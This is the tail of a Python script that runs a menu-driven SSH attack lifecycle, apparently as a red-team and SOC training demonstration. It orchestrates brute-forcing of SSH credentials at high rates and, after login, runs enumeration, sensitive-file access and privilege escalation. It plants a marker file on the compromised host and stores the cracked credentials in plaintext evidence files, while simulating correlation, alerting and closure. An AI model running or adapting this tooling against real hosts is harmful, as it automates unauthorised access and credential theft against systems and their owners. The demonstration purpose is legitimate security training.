        "tactic":"Privilege Escalation","severity":"CRITICAL",
        "escalated":escalated,"results":results,"operator":OPERATOR,
    })
    print()
    success(f"Stage 6 complete — privesc attempt logged")
    info(f"Evidence : {dim(ev_path)}")
    slog(f"STAGE-6 | INC-003 | T1548 | PRIVESC | {target} | "
         f"{'SUCCESS' if escalated else 'BLOCKED'}")
    return results, escalated

# ══════════════════════════════════════════════════════════════
#   FLAG
# ══════════════════════════════════════════════════════════════

def plant_flag(client, target, run):
    flag_ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    flag_name = f"/tmp/.flag_{flag_ts}"
    content   = (f"COMPROMISED | Op:{OPERATOR} | Team:{TEAM} | "
                 f"Time:{datetime.now().isoformat()} | Target:{target}")
    try:
        client.exec_command(
            f'echo "{content}" > {flag_name} && chmod 600 {flag_name}')
        time.sleep(0.1)
        print(f"\n  {R}{'▓'*56}{RS}")
        print(f"  {R}▓{RS}  {bold('PERSISTENCE MARKER PLANTED')}"
              f"{'  '*17}{R}▓{RS}")
        print(f"  {R}▓{RS}  {dim('Path  :')} {green(flag_name)}"
              f"{'  '*8}{R}▓{RS}")
        print(f"  {R}▓{RS}  {dim('Perms :')} {yellow('600')}  "
              f"{dim('Owner:')} {green(USERNAME)}"
              f"{'  '*18}{R}▓{RS}")
        print(f"  {R}{'▓'*56}{RS}")
        alog(f"FLAG PLANTED | {flag_name} | {target}")
        slog(f"FLAG | {flag_name} | {target}")
    except Exception:
        warn("Flag planting failed")

# ══════════════════════════════════════════════════════════════
#   SAVE BRUTE FORCE EVIDENCE
# ══════════════════════════════════════════════════════════════

def _save_bf_evidence(target, mode, attempts, retries,
                      duration, success_flag, password=None):
    run    = get_run()
    ts_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    out    = os.path.join(get_run_dir(run),"bruteforce")
    inc    = "INC-003" if success_flag else "INC-002"
    sev    = "CRITICAL" if success_flag else mode.upper()
    ev_file = os.path.join(out,f"bruteforce_{mode}_{ts_str}.json")
    save_json(ev_file,{
        "stage":2,"incident":inc,"run":run,
        "timestamp":ts_str,"attacker":get_local_ip(),
        "target":target,"port":PORT,"username":USERNAME,
        "mode":mode.upper(),"mitre":"T1110",
        "tactic":"Credential Access",
        "attempts":attempts,"retries":retries,
        "duration":duration,"severity":sev,
        "result":"SUCCESS" if success_flag else "FAILED",
        "credential":password if success_flag else None,
        "operator":OPERATOR,"team":TEAM,
    })
    # NOTE: attack_done is set at Stage 11 (closure) so it cannot
    # prematurely block phase-2 continuation or post-exploit stages.
    update_state(attack_mode=mode.upper(), last_ts=ts_str)
    return ev_file

# ══════════════════════════════════════════════════════════════
#   STAGE 7-8 — CORRELATION & ALERT
# ══════════════════════════════════════════════════════════════

def stage_correlation_alert(target, mode, attempts,
                             duration, escalated, run):
    ts_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    print(f"\n{bold('[ STAGE 07 ]')}  {bold('AI Correlation & Attack Understanding')}")
    sep2()
    info(f"Incident  : {cyan('INC-003')}")
    info(f"Action    : Multi-stage intrusion correlation")
    info(f"Engine    : AI Detection Layer")
    sep2(); print()

    steps = [
        "Ingesting event stream ...",
        "Parsing INC-001 recon artifacts ...",
        "Parsing INC-002 brute force log ...",
        "Parsing INC-003 post-access data ...",
        "Running correlation rules ...",
        "Mapping MITRE ATT&CK chain ...",
        "Computing confidence score ...",
        "Upgrading incident severity ...",
        "Generating AI analysis output ...",
    ]
    for step in steps:
        print(f"  {cyan('[AI]')} {step}", flush=True)
        time.sleep(DEMO_AI_STEP_PAUSE)

    print(); sep2()
    print(f"\n  {bold('AI Correlation Result')}\n")
    print(f"  {dim('Classification')}  : {red(bold('Multi-Stage SSH Intrusion'))}")
    print(f"  {dim('Confidence')}      : {red(bold('VERY HIGH'))}")
    print(f"  {dim('Final Severity')}  : {red(bold('CRITICAL'))}")
    print(f"  {dim('Recommendation')}  : {yellow(bold('Immediate Containment Required'))}")
    print()

    priv_status = red("✓ Escalated!") if escalated else yellow("✗ Blocked")
    chain = [
        ("INC-001","T1046 ","Discovery          ",yellow("LOW     "),green("✓ Recon")),
        ("INC-002","T1110 ","Credential Access  ",yellow(mode.upper().ljust(8)),green("✓ Brute Force")),
        ("INC-003","T1078 ","Initial Access     ",red("CRITICAL"),red("✓ Compromised")),
        ("INC-003","T1082 ","Discovery          ",red("CRITICAL"),red("✓ Enumerated")),
        ("INC-003","T1083 ","File Discovery     ",red("CRITICAL"),red("✓ Files probed")),
        ("INC-003","T1548 ","Privilege Escalation",red("CRITICAL"),priv_status),
    ]
    print(f"  {dim('┌' + '─'*57 + '┐')}")
    for inc,tid,tactic,sev,res in chain:
        color = red if inc=="INC-003" else cyan
        print(f"  {dim('│')}  {color(inc)}  {dim(tid)}  "
              f"{dim(tactic)}  {sev}  {res}  {dim('│')}")
        if inc != "INC-003" or tactic.strip() != "Privilege Escalation":
            print(f"  {dim('│')}     {dim('↓')}"+' '*50+f"{dim('│')}")
    print(f"  {dim('└' + '─'*57 + '┘')}")
    print()

    # Stage 8
    print(f"{bold('[ STAGE 08 ]')}  {bold('Alert Generation & Incident Creation')}")
    sep2()
    alert_id = f"ALT-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    print()
    print(f"  {R}{'═'*56}{RS}")
    print(f"  {R}  CRITICAL ALERT — MULTI-STAGE SSH INTRUSION  {RS}")
    print(f"  {R}{'═'*56}{RS}")
    print(f"  {dim('Alert ID')}   : {bold(alert_id)}")
    print(f"  {dim('Incident')}   : {red(bold('INC-003'))}")
    print(f"  {dim('Source IP')}  : {red(get_local_ip())}")
    print(f"  {dim('Target')}     : {red(target)}")
    print(f"  {dim('Severity')}   : {red(bold('CRITICAL'))}")
    print(f"  {dim('Status')}     : {yellow('INVESTIGATING → ESCALATED')}")
    print(f"  {dim('Confidence')} : {red('VERY HIGH')}")
    print(f"  {dim('Time')}       : "
          f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  {R}{'═'*56}{RS}\n")

    corr_dir  = os.path.join(get_run_dir(run),"correlation")
    corr_file = os.path.join(corr_dir,f"correlation_{ts_str}.json")
    save_json(corr_file,{
        "stage":7,"incident":"INC-003","run":run,
        "timestamp":ts_str,"attacker":get_local_ip(),
        "target":target,
        "classification":"Multi-Stage SSH Intrusion",
        "confidence":"VERY HIGH","final_severity":"CRITICAL",
        "escalated":escalated,"alert_id":alert_id,
        "attack_chain":[
            {"incident":"INC-001","mitre":"T1046",
             "tactic":"Discovery","severity":"LOW"},
            {"incident":"INC-002","mitre":"T1110",
             "tactic":"Credential Access","severity":mode.upper()},
            {"incident":"INC-003","mitre":"T1078",
             "tactic":"Initial Access","severity":"CRITICAL"},
            {"incident":"INC-003","mitre":"T1082+T1033",
             "tactic":"Discovery","severity":"CRITICAL"},
            {"incident":"INC-003","mitre":"T1083",
             "tactic":"Discovery","severity":"CRITICAL"},
            {"incident":"INC-003","mitre":"T1548",
             "tactic":"Privilege Escalation","severity":"CRITICAL"},
        ],
        "recommendation":"Immediate Containment Required",
        "operator":OPERATOR,"team":TEAM,
    })

    success(f"Stage 7 complete — correlation saved")
    success(f"Stage 8 complete — alert {bold(alert_id)} generated")
    info(f"Evidence : {dim(corr_file)}")
    alog(f"INC-003 CORRELATED | {alert_id} | CRITICAL | {target}")
    slog(f"STAGE-7-8 | INC-003 | CORRELATION+ALERT | {alert_id} | CRITICAL")
    return alert_id

# ══════════════════════════════════════════════════════════════
#   STAGES 9-11 — CONTAINMENT, EVIDENCE, CLOSURE
# ══════════════════════════════════════════════════════════════

def stage_containment_closure(target, mode, attempts, retries,
                               duration, password, alert_id,
                               escalated, run):
    ts_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    # Stage 9
    print(f"\n{bold('[ STAGE 09 ]')}  {bold('Containment')}")
    sep2()
    info(f"Incident  : {cyan('INC-003')}")
    info(f"Owner     : {bold('Sharaf')}  {dim('(Infrastructure Lead)')}")
    info(f"Action    : Block attacker IP — terminate access")
    sep2(); print()
    warn(f"Containment required by: {bold('Sharaf')}")
    info("Commands to run on target server (as root/sudo):")
    attacker_ip = get_local_ip()
    print(f"\n  {dim('$')} {cyan(f'sudo ufw deny from {attacker_ip} to any')}")
    print(f"  {dim('$')} {cyan(f'sudo fail2ban-client set sshd banip {attacker_ip}')}\n")
    info(f"Attacker IP  : {red(attacker_ip)}")
    info(f"Status       : {yellow('PENDING — awaiting Sharaf')}")
    print()

    cont_file = os.path.join(get_run_dir(run),"session",
                             f"containment_{ts_str}.json")
    save_json(cont_file,{
        "stage":9,"incident":"INC-003","run":run,
        "timestamp":ts_str,"attacker_ip":attacker_ip,
        "target":target,"action_required":"block attacker IP",
        "owner":"Sharaf",
        "commands":[
            f"sudo ufw deny from {attacker_ip} to any",
            f"sudo fail2ban-client set sshd banip {attacker_ip}",
        ],
        "status":"PENDING","operator":OPERATOR,
    })
    success(f"Stage 9 complete — containment brief saved")
    info(f"Evidence : {dim(cont_file)}")
    slog(f"STAGE-9 | INC-003 | CONTAINMENT PENDING | {attacker_ip}")

    print()
    time.sleep(DEMO_CONTAINMENT_PAUSE)   # automated — no manual confirmation

    # Stage 10 — Evidence preservation
    print(f"\n{bold('[ STAGE 10 ]')}  {bold('Evidence Preservation')}")
    sep2(); print()

    run_dir  = get_run_dir(run)
    ev_items = []
    for sub in ["recon","bruteforce","enumeration",
                "sensitive","privesc","correlation","session"]:
        sub_path = os.path.join(run_dir,sub)
        if os.path.exists(sub_path):
            files = os.listdir(sub_path)
            for f in files: ev_items.append(f"{sub}/{f}")
            if files:
                success(f"{sub:<16} : {dim(str(len(files))+' files saved')}")

    manifest_path = os.path.join(run_dir,"evidence_manifest.json")
    save_json(manifest_path,{
        "stage":10,"incident":"INC-003","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":attacker_ip,
        "total_files":len(ev_items),"files":ev_items,
        "stages_covered":[
            "Stage 1 — T1046 Recon",
            "Stage 2 — T1110 Brute Force",
            "Stage 3 — T1078 Suspicious Login",
            "Stage 4 — T1082+T1033 Enumeration",
            "Stage 5 — T1083 Sensitive Access",
            "Stage 6 — T1548 Privilege Escalation",
            "Stage 7 — AI Correlation",
            "Stage 8 — Alert Generation",
            "Stage 9 — Containment",
        ],
        "preservation_status":"COMPLETE",
        "operator":OPERATOR,"team":TEAM,
    })
    print()
    success(f"Stage 10 complete — {len(ev_items)} files preserved")
    info(f"Manifest : {dim(manifest_path)}")
    slog(f"STAGE-10 | EVIDENCE PRESERVED | {len(ev_items)} files")

    # Stage 11 — Closure
    print(f"\n{bold('[ STAGE 11 ]')}  {bold('Incident Closure & Summary')}")
    sep2(); print()
    print(f"  {G}{'═'*58}{RS}")
    print(f"  {G}  INCIDENT CLOSED — MULTI-STAGE SSH INTRUSION  {RS}")
    print(f"  {G}{'═'*58}{RS}\n")

    rows = [
        ("Incident",      "INC-001 + INC-002 + INC-003"),
        ("Alert ID",      alert_id),
        ("Target",        target),
        ("Attacker IP",   attacker_ip),
        ("Credential",    f"{USERNAME}:{password}" if password else "N/A"),
        ("Privesc",       "SUCCESS" if escalated else "BLOCKED"),
        ("Mode",          mode.upper()),
        ("Attempts",      str(attempts)),
        ("Retries",       str(retries)),
        ("Duration",      duration),
        ("Final Severity","CRITICAL"),
        ("Containment",   "Executed by Sharaf"),
        ("Evidence",      f"{len(ev_items)} files"),
        ("Status",        "CLOSED"),
    ]
    for label, value in rows:
        lc = cyan(f"{label:<16}")
        if label=="Final Severity":  vc = red(bold(value))
        elif label=="Status":        vc = green(bold(value))
        elif label=="Privesc" and value=="SUCCESS": vc = red(bold(value))
        elif label=="Privesc":       vc = green(value)
        else:                        vc = yellow(value)
        print(f"  {lc}: {vc}")

    print()
    print(f"  {dim('MITRE techniques observed:')}")
    techniques = [
        ("T1046","Discovery",            "Network Service Scanning"),
        ("T1110","Credential Access",    "Brute Force"),
        ("T1078","Initial Access",       "Valid Accounts"),
        ("T1082","Discovery",            "System Information Discovery"),
        ("T1033","Discovery",            "System Owner/User Discovery"),
        ("T1083","Discovery",            "File and Directory Discovery"),
        ("T1548","Privilege Escalation", "Abuse Elevation Control"),
    ]
    for tid, tactic, name in techniques:
        print(f"  {red(tid):<10} {dim(tactic):<26} {dim(name)}")

    print(); sep()
    success(f"{bold('Full attack lifecycle complete')}")
    info(f"Run       : #{run:03d}")
    info(f"Evidence  : {dim(run_dir)}")
    info(f"Log       : {dim(ATTACK_LOG)}")
    info(f"Session   : {dim(SESSION_LOG)}")
    sep()

    closure_path = os.path.join(run_dir,"session",f"closure_{ts_str}.json")
    save_json(closure_path,{
        "stage":11,"incident":"INC-003","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":attacker_ip,"alert_id":alert_id,
        "credential":f"{USERNAME}:{password}" if password else None,
        "escalated":escalated,"mode":mode.upper(),
        "attempts":attempts,"retries":retries,"duration":duration,
        "final_severity":"CRITICAL",
        "containment":"Executed by Sharaf",
        "evidence_files":len(ev_items),"status":"CLOSED",
        "mitre_techniques":[t[0] for t in techniques],
        "operator":OPERATOR,"team":TEAM,
        "lessons_learned": (
            f"Full intrusion lifecycle demonstrated across 11 stages. "
            f"Credential brute-forced after {attempts} attempts. "
            f"Privilege escalation {'succeeded' if escalated else 'was blocked by system hardening'}. "
            f"Incident contained and closed by SOC team."
        ),
    })
    alog(f"INC-003 CLOSED | {alert_id} | {len(ev_items)} evidence files")
    slog(f"STAGE-11 | CLOSURE | RUN #{run:03d} | COMPLETE")
    # Mark attack complete only after all stages have finished.
    update_state(attack_done=True, attack_result="SUCCESS")

# ══════════════════════════════════════════════════════════════
#   FULL LIFECYCLE ORCHESTRATOR
# ══════════════════════════════════════════════════════════════

def full_attack(target=None):
    """Full automated attack lifecycle — Stages 1–11, no manual prompts.

    Attempts, retries, and duration are cumulative across both HIGH and
    CRITICAL phases so all evidence, correlation, and closure records
    reflect the full attack effort rather than just the final phase.
    """
    run = get_run()
    alog("FULL LIFECYCLE STARTED")

    # ── Stage 1 — Recon ──────────────────────────────────────────
    # If a target is already stored from a prior recon run, reuse it
    # to avoid redundant nmap scans and manual selection prompts.
    saved_target = load_state().get("target")
    if target is None and saved_target:
        target = saved_target
        info(f"Reusing saved target: {bold(target)} (skipping recon)")
        alog(f"RECON SKIPPED — reusing target {target}")
    else:
        target = do_recon(target)
        if not target:
            warn("No target — aborting."); return
        update_state(target=target)
    time.sleep(DEMO_INTER_STAGE_PAUSE)

    # ── Stage 2 — Brute Force (HIGH → CRITICAL, cumulative) ──────
    # Counters accumulate across both phases so that evidence, correlation,
    # and the closure summary always reflect the total attack effort.
    start_ts       = datetime.now()
    total_attempts = 0
    total_retries  = 0
    mode           = "high"
    password       = None
    client         = None

    # Phase 1 — HIGH mode
    ret_high = run_attack(target, "high")
    if isinstance(ret_high, tuple):
        if len(ret_high) == 5:
            # SUCCESS in HIGH phase
            password, att, ret, client, _ = ret_high
            total_attempts += att
            total_retries  += ret
        else:
            # FAILED in HIGH phase — accumulate partial counts
            _, att, ret = ret_high[0], ret_high[1], ret_high[2]
            total_attempts += att
            total_retries  += ret

    # Phase 2 — CRITICAL mode (only if HIGH didn't succeed)
    if client is None:
        info("HIGH phase did not succeed — auto-escalating to CRITICAL")
        alog("AUTO-ESCALATE | HIGH → CRITICAL")
        time.sleep(DEMO_PHASE_TRANSITION)
        mode     = "critical"
        ret_crit = run_attack(target, "critical")
        if isinstance(ret_crit, tuple):
            if len(ret_crit) == 5:
                password, att, ret, client, _ = ret_crit
                total_attempts += att
                total_retries  += ret
            else:
                _, att, ret = ret_crit[0], ret_crit[1], ret_crit[2]
                total_attempts += att
                total_retries  += ret

    # Neither phase succeeded — abort cleanly.
    if client is None or password is None:
        warn("Attack did not succeed in either phase — aborting."); return

    duration = str(datetime.now() - start_ts).split(".")[0]
    # Save brute-force evidence with full cumulative counters.
    _save_bf_evidence(target, mode, total_attempts, total_retries,
                      duration, True, password)

    # ── Stages 4–6 — Post Exploitation ───────────────────────────
    time.sleep(DEMO_INTER_STAGE_PAUSE)
    enum_res = stage_enumeration(client, target, run)

    time.sleep(DEMO_INTER_STAGE_PAUSE)
    sens_res = stage_sensitive_access(client, target, run)

    time.sleep(DEMO_INTER_STAGE_PAUSE)
    priv_res, escalated = stage_privesc(client, target, run)

    plant_flag(client, target, run)
    client.close()
    print(f"\n  {yellow('[*]')} Session terminated — post-access stages complete.\n")

    # ── Stages 7–8 — Correlation + Alert ─────────────────────────
    # Pass cumulative totals so correlation JSON reflects full effort.
    time.sleep(DEMO_INTER_STAGE_PAUSE)
    alert_id = stage_correlation_alert(
        target, mode, total_attempts, duration, escalated, run)

    # ── Stages 9–11 — Containment + Evidence + Closure ───────────
    # Pass cumulative totals to closure/summary records.
    time.sleep(DEMO_INTER_STAGE_PAUSE)
    stage_containment_closure(
        target, mode, total_attempts, total_retries, duration,
        password, alert_id, escalated, run)

    alog("FULL LIFECYCLE COMPLETE")

# ══════════════════════════════════════════════════════════════
#   ATTACK MENU (standalone)
# ══════════════════════════════════════════════════════════════

def attack_menu(target):
    """Standalone brute-force menu. Option 1 runs the full stage lifecycle."""
    run = get_run()
    while True:
        os.system("clear"); _print_main_banner()
        info(f"Run #{run:03d}  |  Target: {bold(target)}\n")
        print(f"  {dim('[1]')}  {green('Full Attack')}   Stages 1–11  (HIGH → CRITICAL → all post-exploit)")
        print(f"  {dim('[2]')}  {yellow('HIGH')}          ~150 attempts/min — brute only")
        print(f"  {dim('[3]')}  {red('CRITICAL')}      ~600 attempts/min — brute only")
        print(f"  {dim('[4]')}  Dry Run       no real connections")
        print(f"  {dim('[5]')}  Back\n")
        try:
            c = input(f"  {C}>{RS} ").strip()
        except KeyboardInterrupt:
            return
        if c == "1":
            # Option 1: full lifecycle — identical to main menu option 1.
            # Uses full_attack() so all 11 stages run with cumulative data.
            full_attack(target)
        elif c == "2": run_attack(target, "high")
        elif c == "3": run_attack(target, "critical")
        elif c == "4":
            m = input(f"  {C}[?]{RS} [high/critical]: ").strip().lower()
            run_attack(target, m if m in ["high","critical"] else "high",
                       dry_run=True)
        elif c == "5": return
        if c in ["1","2","3","4"]:
            input(f"\n  {dim('Press Enter...')}")

# ══════════════════════════════════════════════════════════════
#   EVIDENCE VIEWER
# ══════════════════════════════════════════════════════════════

def show_evidence():
    os.system("clear")
    print(f"\n{bold('Evidence — All Runs')}\n"); sep()
    if not os.path.exists(EVIDENCE_DIR):
        warn("No evidence yet."); return
    runs = sorted([d for d in os.listdir(EVIDENCE_DIR)
                   if d.startswith("run_") and
                      os.path.isdir(os.path.join(EVIDENCE_DIR,d))])
    if not runs: warn("No runs yet."); return
    total_all = 0
    for rd in runs:
        full = os.path.join(EVIDENCE_DIR,rd)
        counts = {}
        for sub in ["recon","bruteforce","enumeration",
                    "sensitive","privesc","correlation","session"]:
            p = os.path.join(full,sub)
            counts[sub] = len(os.listdir(p)) if os.path.exists(p) else 0
        total = sum(counts.values()); total_all += total
        cur = f"  {green('← current')}" if rd==f"run_{get_run():03d}" else ""
        print(f"  {cyan(rd)}  "
              + "  ".join(f"{k}:{v}" for k,v in counts.items() if v>0)
              + f"  total:{total}{cur}")
    sep()
    info(f"Total files : {total_all}")
    info(f"Path        : {dim(EVIDENCE_DIR)}")
    info(f"Log         : {dim(ATTACK_LOG)}")
    print()

# ══════════════════════════════════════════════════════════════
#   STATUS
# ══════════════════════════════════════════════════════════════

def print_main_status():
    s   = load_state()
    run = s.get("run",1)
    tgt = s.get("target") or "—"
    rd  = s.get("recon_done",False)
    ad  = s.get("attack_done",False)
    res = s.get("attack_result","—")
    rdir = os.path.join(EVIDENCE_DIR,f"run_{run:03d}")
    def cnt(sub):
        p = os.path.join(rdir,sub)
        return len(os.listdir(p)) if os.path.exists(p) else 0
    sep()
    info(f"Run #{run:03d}  |  Operator: {OPERATOR}  |  v{VERSION}")
    info(f"Target   : {cyan(tgt)}")
    info(f"Recon    : {green('[✓]') if rd else yellow('[ ]')}  "
         + dim(str(cnt('recon'))+" files"))
    info(f"Attack   : {green('[✓]') if ad else yellow('[ ]')}  "
         + dim(str(cnt('bruteforce'))+" files"))
    if ad: info(f"Result   : {green(res) if res=='SUCCESS' else yellow(res)}")
    extra = sum(cnt(s) for s in
                ["enumeration","sensitive","privesc","correlation","session"])
    if extra: info(f"Post-acc : {green('[✓]')}  "+dim(f"{extra} files"))
    sep()

# ══════════════════════════════════════════════════════════════
#   MAIN MENU
# ══════════════════════════════════════════════════════════════

def main():
    os.system("clear"); _print_main_banner()
    if not os.path.exists(BASE_DIR):
        do_setup()
        input(f"\n  {dim('Press Enter...')}")
    alog("SESSION STARTED")

    while True:
        os.system("clear"); _print_main_banner()
        print_main_status(); print()
        print(f"  {dim('[1]')}  {green('Full Lifecycle')}   "
              f"{dim('Recon → Brute Force → Post-Access → Closure')}")
        print(f"  {dim('[2]')}  {yellow('Recon Only')}       "
              f"{dim('T1046 — Stage 1')}")
        print(f"  {dim('[3]')}  {red('Brute Force')}      "
              f"{dim('T1110 — Stage 2 (needs recon first)')}")
        print(f"  {dim('[4]')}  New Run          "
              f"{dim('Save + start fresh')}")
        print(f"  {dim('[5]')}  Evidence         "
              f"{dim('View all runs')}")
        print(f"  {dim('[6]')}  Setup            "
              f"{dim('Re-initialize environment')}")
        print(f"  {dim('[7]')}  Exit\n")

        try:
            choice = input(f"  {C}>{RS} ").strip()
        except KeyboardInterrupt:
            break

        if choice=="1":
            alog("FULL LIFECYCLE STARTED")
            full_attack()
            alog("FULL LIFECYCLE COMPLETE")
        elif choice=="2":
            alog("RECON STARTED"); do_recon(); alog("RECON COMPLETE")
        elif choice=="3":
            target = load_state().get("target")
            if not target:
                warn("No target — run Recon first.")
                time.sleep(2); continue
            alog(f"BRUTE FORCE STARTED | {target}")
            attack_menu(target)
            alog("BRUTE FORCE COMPLETE")
        elif choice=="4":
            old, new = next_run()
            success(f"Run #{old:03d} saved.")
            info(f"New run #{new:03d} started.")
            alog(f"NEW RUN | #{old:03d} → #{new:03d}")
            time.sleep(1); continue
        elif choice=="5": show_evidence()
        elif choice=="6": do_setup()
        elif choice=="7": break
        else: continue

        input(f"\n  {dim('Press Enter to return...')}")

    alog("SESSION ENDED")
    print(f"\n  {dim(f'Evidence : {EVIDENCE_DIR}')}")
    print(f"  {dim(f'Log      : {ATTACK_LOG}')}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {yellow('[!]')} Interrupted.\n")
        sys.exit(0)
